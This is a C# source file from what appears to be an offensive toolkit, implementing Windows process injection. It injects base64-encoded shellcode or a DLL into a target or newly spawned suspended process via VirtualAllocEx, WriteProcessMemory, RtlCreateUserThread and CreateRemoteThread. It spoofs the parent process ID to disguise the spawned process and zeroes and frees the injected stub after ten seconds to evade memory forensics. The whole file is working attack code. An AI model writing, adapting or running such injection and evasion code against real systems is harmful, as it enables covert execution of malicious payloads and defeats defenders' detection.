using System;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading;
using Core.WindowsInternals;

namespace Core.Injection
{
    internal static class Injection
    {
        internal delegate void InjectionMethod(int pid32, byte[] payload, bool rwx = false);

        internal static void InjectSC(InjectionMethod injectionFunc, string[] args)
        {
            try
            {
                int pid;
                var ppid = 0;
                string path;
                var rwx = false;

                if (args.Contains("rwx"))
                {
                    rwx = true;
                    args = args.Where(arg => arg != "rwx").ToArray();
                }

                if (args.Length < 3)
                {
                    path = @"c:\windows\system32\searchprotocolhost.exe";
                    Console.WriteLine($" > [-] Missing Path or PID parameter starting process: {path}");
                    pid = (int) SharpCreateProcess(ppid, path, true);
                }
                else
                {
                    path = args[2].Replace("\"", "");
                    Console.WriteLine($" > [+] Injecting into: {path}");
                    if (!int.TryParse(args[2], out pid))
                    {
                        if (args.Length > 3)
                        {
                            int.TryParse(args[3], out ppid);
                        }

                        Console.WriteLine($" > [+] Spoofing ppid: {ppid}");
                        pid = (int) SharpCreateProcess(ppid, path, true);
                    }
                }

                var sc = Convert.FromBase64String(args[1]);
                injectionFunc(pid, sc, rwx);
            }
            catch (Exception e)
            {
                Console.WriteLine($"[-] Error: {e}");
            }
        }

        internal static void InjectDLL(string[] args)
        {
            try
            {
                int pid;
                var ppid = 0;
                string path;

                if (args.Length < 3)
                {
                    path = @"c:\windows\system32\searchprotocolhost.exe";
                    Console.WriteLine($"[-] Missing Path or PID parameter using {path}");
                    pid = (int) SharpCreateProcess(ppid, path, true);
                }
                else
                {
                    path = args[2].Replace("\"", "");
                    Console.WriteLine($" > [+] Injecting into: {path}");
                    if (!int.TryParse(args[2], out pid))
                    {
                        if (args.Length > 3)
                        {
                            int.TryParse(args[3], out ppid);
                        }

                        Console.WriteLine($" > [+] Spoofing ppid: {ppid}");
                        pid = (int) SharpCreateProcess(ppid, path, true);
                    }
                }

                var payload = args[1].Replace("\"", "");

                Console.WriteLine($" > [+] Injecting DLL ({payload}) into PID: {pid}");

                var hProcess = Internals.OpenProcess(Internals.PROCESS_ALL_ACCESS, false, (uint) pid);
                Console.WriteLine($" > [+] OpenProcess hProcess: {hProcess}");

                var allocMemAddress = Internals.VirtualAllocEx(hProcess, IntPtr.Zero, (payload.Length + 1) * Marshal.SizeOf(typeof(char)),
                    Internals.MEM_COMMIT | Internals.MEM_RESERVE,
                    Internals.PAGE_READWRITE);

                var targetDLL = Internals.LoadLibrary("kernel32.dll");
                if (targetDLL == IntPtr.Zero)
                {
                    Console.WriteLine(" > [-] Error cannot find kernel32.dll");
                }

                var procAddress = Internals.GetProcAddress(targetDLL, "LoadLibraryA");

                Console.WriteLine(" > [+] VirtualAllocEx : {0:X}", allocMemAddress.ToInt64());

                Internals.WriteProcessMemory(hProcess, allocMemAddress, Encoding.Default.GetBytes(payload), (payload.Length + 1) * Marshal.SizeOf(typeof(char)), out _);

                Console.WriteLine($" > [+] CreateRemoteThread: {procAddress}");
                var hThread = Internals.CreateRemoteThread(hProcess, IntPtr.Zero, 0, procAddress, allocMemAddress, 0, IntPtr.Zero);

                if (hThread == IntPtr.Zero)
                {
                    Console.WriteLine($" > [-] Error: CreateRemoteThread failed > LastError: {Marshal.GetLastWin32Error()}");
                }

                if (Marshal.GetLastWin32Error() != 0)
                {
                    Console.WriteLine($" > LastError: {Marshal.GetLastWin32Error()}");
                }
            }
            catch (Exception e)
            {
                Console.WriteLine($"[-] Error: {e}");
            }
        }

        internal static void RtlCreateUserThreadInjection(int pid32, byte[] payload32, bool rwx = false)
        {
            Console.WriteLine($" > [+] Injecting into PID: {pid32}");
            var hProcess = Internals.OpenProcess(Internals.PROCESS_ALL_ACCESS, false, (uint) pid32);

            Console.WriteLine($" > [+] OpenProcess hProcess:  0x{hProcess.ToInt64():X8}");
            var size = payload32.Length * 2;

            var protect = rwx ? Internals.PAGE_EXECUTE_READWRITE : Internals.PAGE_READWRITE;

            var hBaseAddress = Internals.VirtualAllocEx(hProcess, IntPtr.Zero, size, 0x3000, protect);
            if (hBaseAddress == IntPtr.Zero)
            {
                Console.WriteLine($" > [-] VirtualAllocEx {(rwx ? "RWX" : "RW")}: Failed");
                return;
            }

            Console.WriteLine($" > [+] VirtualAllocEx {(rwx ? "RWX" : "RW")}: 0x{hBaseAddress.ToInt64():X8}");
            if (Internals.WriteProcessMemory(hProcess, hBaseAddress, payload32, payload32.Length, out _))
            {
                Console.WriteLine(" > [+] WriteProcessMemory succeeded");
                var tHandle = IntPtr.Zero;

                if (protect != Internals.PAGE_EXECUTE_READWRITE)
                {
                    if (!Internals.VirtualProtectEx(hProcess, hBaseAddress, size, Internals.PAGE_EXECUTE_READ, out _))
                    {
                        Console.WriteLine(" > [-] VirtualProtectEx RX: Failed");
                        return;
                    }
                }

                var hintThread = Internals.RtlCreateUserThread(hProcess, IntPtr.Zero, false, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, hBaseAddress, IntPtr.Zero, ref tHandle,
                    IntPtr.Zero);

                if (hintThread != 0)
                {
                    var hThread = Internals.CreateRemoteThread(hProcess, IntPtr.Zero, 0, hBaseAddress, IntPtr.Zero, 0, IntPtr.Zero);
                    Console.WriteLine($" > [-] RtlCreateUserThread Failed - Failing over to CreateRemoteThread: {hThread}");
                    if (hThread == IntPtr.Zero)
                    {
                        Console.WriteLine($" > [-] CreateRemoteThread Failed - Failing over to CreateRemoteThread64: {hThread}");
                        Util.CreateRemoteThread64((uint) hProcess.ToInt32(), (uint) hBaseAddress.ToInt32(), 0);
                    }

                    var threadHandleClosed = Internals.CloseHandle(hThread);
                    Console.WriteLine($" > [+] CloseHandle to Inject Thread: {threadHandleClosed}");
                }
                else
                {
                    Console.WriteLine($" > [+] RtlCreateUserThread Injection: {tHandle}");
                    var closedHandle = Internals.CloseHandle(tHandle);
                    Console.WriteLine($" > [+] CloseHandle to Inject Thread: {closedHandle}");
                }
            }
            else
            {
                Console.WriteLine(" > [-] Failed to WriteProcessMemory");
            }

            // wait for execution to start in the remote process then clear the shellcode stub in the remote process
            Thread.Sleep(10000);
            var overwriteData = new byte[payload32.Length];
            for (var i = 0; i < overwriteData.Length; i++)
            {
                overwriteData[i] = 0x00;
            }

            if (!Internals.VirtualProtectEx(hProcess, hBaseAddress, size, Internals.PAGE_READWRITE, out _))
            {
                Console.WriteLine(" > [-] VirtualProtectEx RW: Failed");
                return;
            }

            if (Internals.WriteProcessMemory(hProcess, hBaseAddress, overwriteData, overwriteData.Length, out _))
            {
                Console.WriteLine(" > [-] Overwritten Memory Allocation with 0x00's: True");
            }

            if (!Internals.VirtualFreeEx(hProcess, hBaseAddress, 0, Internals.FreeType.Release))
            {
                Console.WriteLine(" > [-] VirtualFreeEx after 10 seconds: Failed");
            }
            else
            {
                Console.WriteLine(" > [+] VirtualFreeEx after 10 seconds: True");
            }

            var closed = Internals.CloseHandle(hProcess);
            Console.WriteLine($" > [+] Close handle Process: {closed}");

            if (Marshal.GetLastWin32Error() != 0)
            {
                Console.WriteLine($" > LastError: {Marshal.GetLastWin32Error()}");
            }
        }

        private static uint SharpCreateProcess(int parentProcessId, string commandLine, bool createSuspended)
        {
            var pInfo = new Internals.ProcessInformation();
            var sInfoEx = new Internals.Startupinfoex();
            sInfoEx.StartupInfo.cb = (uint) Marshal.SizeOf(sInfoEx);
            var lpValue = IntPtr.Zero;

            try
            {
                if (parentProcessId > 0)
                {
                    var lpSize = IntPtr.Zero;
                    Internals.InitializeProcThreadAttributeList(IntPtr.Zero, 1, 0, ref lpSize);

                    sInfoEx.lpAttributeList = Marshal.AllocHGlobal(lpSize);
                    Internals.InitializeProcThreadAttributeList(sInfoEx.lpAttributeList, 1, 0, ref lpSize);

                    var parentHandle = Process.GetProcessById(parentProcessId).Handle;
                    // This value should persist until the attribute list is destroyed using the DeleteProcThreadAttributeList function
                    lpValue = Marshal.AllocHGlobal(IntPtr.Size);
                    Marshal.WriteIntPtr(lpValue, parentHandle);

                    Internals.UpdateProcThreadAttribute(sInfoEx.lpAttributeList, 0, (IntPtr) Internals.PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, lpValue, (IntPtr) IntPtr.Size,
                        IntPtr.Zero, IntPtr.Zero);
                }

                var pSec = new Internals.SecurityAttributes();
                var tSec = new Internals.SecurityAttributes();
                pSec.nLength = Marshal.SizeOf(pSec);
                tSec.nLength = Marshal.SizeOf(tSec);

                uint processCreationFlags = 0;

                var ppidSpoof = parentProcessId > 0;

                if (createSuspended)
                {
                    processCreationFlags |= Internals.CREATE_SUSPENDED;
                }

                if (ppidSpoof)
                {
                    processCreationFlags |= Internals.EXTENDED_STARTUPINFO_PRESENT;
                }

                Internals.CreateProcess(null, commandLine, ref pSec, ref tSec, false, processCreationFlags,
                    IntPtr.Zero, null, ref sInfoEx, out pInfo);

                return pInfo.dwProcessId;
            }
            finally
            {
                // Free the attribute list
                if (sInfoEx.lpAttributeList != IntPtr.Zero)
                {
                    Internals.DeleteProcThreadAttributeList(sInfoEx.lpAttributeList);
                    Marshal.FreeHGlobal(sInfoEx.lpAttributeList);
                }

                Marshal.FreeHGlobal(lpValue);

                // Close process and thread handles
                if (pInfo.hThread != IntPtr.Zero)
                {
                    Console.WriteLine($" > [+] CloseHandle hThread: 0x{pInfo.hThread.ToInt64():X}");
                    Internals.CloseHandle(pInfo.hThread);
                }

                if (pInfo.hProcess != IntPtr.Zero)
                {
                    Console.WriteLine($" > [+] CloseHandle hProcess: 0x{pInfo.hProcess.ToInt64():X}");
                    Internals.CloseHandle(pInfo.hProcess);
                }
            }
        }
    }
}